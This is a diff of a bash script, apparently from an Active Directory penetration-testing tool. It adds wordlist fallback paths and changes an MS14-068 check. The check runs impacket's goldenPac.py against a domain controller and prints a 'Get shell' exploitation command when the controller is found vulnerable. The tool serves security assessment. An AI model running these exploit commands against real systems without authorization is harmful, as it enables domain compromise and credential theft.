@@ -16,15 +16,17 @@ user=""
 password=""
 modules="interactive"
 output_dir="$(pwd)"
+wordlists_dir="/opt/lwp-wordlists"
 pass_list="/usr/share/wordlists/rockyou.txt"
+if [ ! -f "${pass_list}" ]; then pass_list="${wordlists_dir}/rockyou.txt"; fi
 users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
+if [ ! -f "${users_list}" ]; then users_list="${wordlists_dir}/cirt-default-usernames.txt"; fi
 curr_targets="Domain Controllers"
 custom_target_scanned=false
 autoconfig_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
-wordlists_dir="/opt/lwp-wordlists"
 impacket_findDelegation=$(which findDelegation.py)
 if [ ! -f "${impacket_findDelegation}" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi
 impacket_GetUserSPNs=$(which GetUserSPNs.py)
@@ -1197,10 +1199,14 @@ ms14-068_check () {
     if [ ! -f "${impacket_goldenPac}" ]; then
         echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
     else
-        ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
-        if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
-            echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found! Follow steps below for exploitation:${NC}"
-            echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] ms14-068 requires credentials${NC}"
+        else
+            ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
+            if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
+                echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found (False postive possible on newer Windows versions)! Follow steps below for exploitation:${NC}"
+                echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
+            fi
         fi
     fi
     echo -e ""
